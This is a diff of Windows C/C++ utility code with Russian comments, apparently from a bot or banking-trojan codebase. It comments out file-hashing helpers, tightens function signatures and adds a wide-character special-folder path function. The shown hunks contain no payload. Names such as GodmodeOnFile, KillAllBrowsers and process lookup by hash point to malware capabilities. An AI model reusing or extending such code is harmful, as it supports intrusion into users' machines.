@@ -213,6 +213,9 @@ char *GetOSInfo()
 	return Ret;
 }
 
+
+/*
+
 char * FileToMD5(char *URL)
 {
 	//char *BotId = (char*)MemAlloc( 2048 );
@@ -221,9 +224,9 @@ char * FileToMD5(char *URL)
 	MD5Init(&ctx);
 	MD5Update( &ctx, (unsigned char*)URL, m_lstrlen( URL ) );
 
-	unsigned char buff[16];	
+	unsigned char buff[16];
 	MD5Final( buff, &ctx );
-	char * UidHash =(char*)MemAlloc( 33 );;
+	char * UidHash =(char*)MemAlloc( 33 );
 
 	int p = 0;
 	typedef int ( WINAPI *fwsprintfA )( LPTSTR lpOut, LPCTSTR lpFmt, ... );
@@ -235,14 +238,17 @@ char * FileToMD5(char *URL)
 		p += 2;
 	}	
 	
-	UidHash[32] = '\0';
+	UidHash[32] = 0;
 
 	
 return UidHash;
 }
+*/
+
 
 // добавлено при добавлении оперы
 /************************************************************************/
+/*
 DWORD FileSize(HANDLE hFile)
 {
 	DWORD filesizeHigh = 0;
@@ -252,10 +258,11 @@ DWORD FileSize(HANDLE hFile)
 	return (DWORD)(Int64ShllMod32((unsigned hyper)filesizeHigh, 32) | filesizeLow);
 	//return ((((unsigned hyper)filesizeHigh) << 32) | filesizeLow);
 }
-
+*/
 /************************************************************************/
 /*                          Читает файл в буфер                         */
 /*----------------------------------------------------------------------*/
+/*
 int ReadWholeFile(char *szFileName, char **OutBuf, int *Error)
 {
 	*Error = NOERROR;
@@ -287,52 +294,14 @@ int ReadWholeFile(char *szFileName, char **OutBuf, int *Error)
 	return result;
 }
 
-/************************************************************************/
-char *CalcFileMD5Hash(char *szFileName)
-{
-	char *fileData = NULL;
-	char *UidHash  = NULL;
-	
-	int Error = 0;
-	int fSize = ReadWholeFile((char *)szFileName, &fileData, &Error);
-	if (fSize)
-	{
-		MD5_CTX ctx;	
-
-		MD5Init(&ctx);
-		MD5Update( &ctx, (unsigned char*)fileData, fSize );
-
-		UidHash = (char *)MemAllocAndClear(16);;
-		MD5Final((unsigned char *)UidHash, &ctx );
-
-		// Из-под файла
-		MemFree(fileData);
-	}
-	return UidHash;
-}
 
 
-string CalcFileMD5Hash2(char *szFileName)
-{
-	string Hash;
-	char *FileData = NULL;
+*/
 
-	int Error = 0;
-	int Size = ReadWholeFile((char *)szFileName, &FileData, &Error);
-	if (Size)
-	{
-		Hash = CalcMd5SummForBuffer(FileData, Size);
-
-		// Из-под файла
-		MemFree(FileData);
-	}
-
-	return Hash;
-}
 
 
 //------------------------------------------------------------ 
-//гениратция нового уида
+//генирация нового уида
 int myHashData(DWORD lpData, DWORD dwDataSize) 
 {
 	DWORD dwResult = 0;
@@ -866,6 +835,7 @@ DWORD GetVirtualFreeAddr()
 	return dwAddr;
 }
 
+/*
 
 DWORD GetFileHash( WCHAR *File )
 {
@@ -934,6 +904,7 @@ DWORD GetFileHash( WCHAR *File )
 	return CalcHash( Hash );
 }
 
+*/
 
 bool GodmodeOnFile( WCHAR *Filename )
 {
@@ -1058,7 +1029,7 @@ DWORD GetExplorerPid()
 	// В случае если не удалось определить идентификатор по хэндлу окна
 	// определяем его по имени запущенного процесса
 	if ( !ExplorerPid )
-		ExplorerPid = GetProcessIdByHash(0x490A0972);
+		ExplorerPid = GetProcessIdByHash(0x490A0972 /* explorer.exe */);
 
 	return ExplorerPid;
 }
@@ -1779,7 +1750,7 @@ bool Registry::SaveRegKeyPath(HKEY hRoot, PCHAR SubKey,PCHAR OutFile)
 //----------------------------------------------------------------------------
 
 
-DWORD File::WriteBufferA(const PCHAR FileName, const LPVOID Buffer, DWORD BufferSize)
+DWORD File::WriteBufferA(const char* FileName, const LPVOID Buffer, DWORD BufferSize)
 {
 	// Записать данные из буфера в файл. ANSI версия
 
@@ -1801,7 +1772,7 @@ DWORD File::WriteBufferA(const PCHAR FileName, const LPVOID Buffer, DWORD Buffer
 }
 //----------------------------------------------------------------------------
 
-DWORD File::WriteBufferW(PWCHAR FileName, LPVOID Buffer, DWORD BufferSize)
+DWORD File::WriteBufferW(const wchar_t* FileName, LPVOID Buffer, DWORD BufferSize)
 {
 	// Записать данные из буфера в файл. Unicode версия
 
@@ -1851,7 +1822,7 @@ LPBYTE FileRealReadToBuffer(HANDLE File, DWORD &BufferSize)
 
 //----------------------------------------------------------------------------
 
-LPBYTE File::ReadToBufferA(PCHAR FileName, DWORD &BufferSize)
+LPBYTE File::ReadToBufferA(const char* FileName, DWORD &BufferSize)
 {
 	// Прочитать файл в буфер
 
@@ -1865,7 +1836,7 @@ LPBYTE File::ReadToBufferA(PCHAR FileName, DWORD &BufferSize)
 }
 //----------------------------------------------------------------------------
 
-LPBYTE File::ReadToBufferW(PWCHAR FileName, DWORD &BufferSize)
+LPBYTE File::ReadToBufferW(const wchar_t* FileName, DWORD &BufferSize)
 {
 	// Прочитать файл в буфер
 	if (FileName == NULL)
@@ -2312,6 +2283,7 @@ bool FileCreateInFolder(int FlagFolderDest, WCHAR*Path,LPVOID Data,int count)
 }
 // ----------------------------------------------------------------------------------------
 
+/*
 int ReadFileA(char *szFileName, char **OutBuf)
 {	
 	int result = 0;
@@ -2336,6 +2308,9 @@ int ReadFileA(char *szFileName, char **OutBuf)
 	
 	return result;
 }
+*/
+
+/*
 //не проверенно
 bool GetFileDataFilder(int FlagFolderDest, WCHAR*Path,LPVOID Data,int *count)
 {
@@ -2353,6 +2328,7 @@ bool GetFileDataFilder(int FlagFolderDest, WCHAR*Path,LPVOID Data,int *count)
 	return true;
 }
 
+*/
 
 BOOL KillProcess(DWORD pid,DWORD TimeOut )
 {
@@ -2642,7 +2618,7 @@ void KillAllBrowsers()
 //                          специальной папке системы
 //  (Надстройка над ЫРGetSpecialFolderPath)
 //------------------------------------------------------------
-string GetSpecialFolderPathA(int CSIDL, const char *AddName)
+string GetSpecialFolderPathA(int CSIDL, const char *FileName)
 {
 	string Path(MAX_PATH);
 
@@ -2650,10 +2626,10 @@ string GetSpecialFolderPathA(int CSIDL, const char *AddName)
 	if (R)
 	{
 		Path.CalcLength();
-        if (!AddName || *AddName != '\\')
+		if (!FileName || *FileName != '\\')
 			Path += "\\";
-		if (AddName)
-			Path += AddName;
+		if (FileName)
+			Path += FileName;
 
 	}
 	else
@@ -2661,6 +2637,29 @@ string GetSpecialFolderPathA(int CSIDL, const char *AddName)
 
 	return Path;
 }
+
+
+wstring GetSpecialFolderPathW(int CSIDL, const wchar_t *FileName)
+{
+	wstring Path(MAX_PATH);
+
+	BOOL R = (BOOL)pSHGetSpecialFolderPathW(NULL, Path.t_str(), CSIDL, TRUE);
+	if (R)
+	{
+		Path.CalcLength();
+		if (!FileName || *FileName != '\\')
+			Path += L"\\";
+		if (FileName)
+			Path += FileName;
+
+	}
+	else
+		Path.Clear();
+
+	return Path;
+}
+
+
 
 
 //------------------------------------------------------------
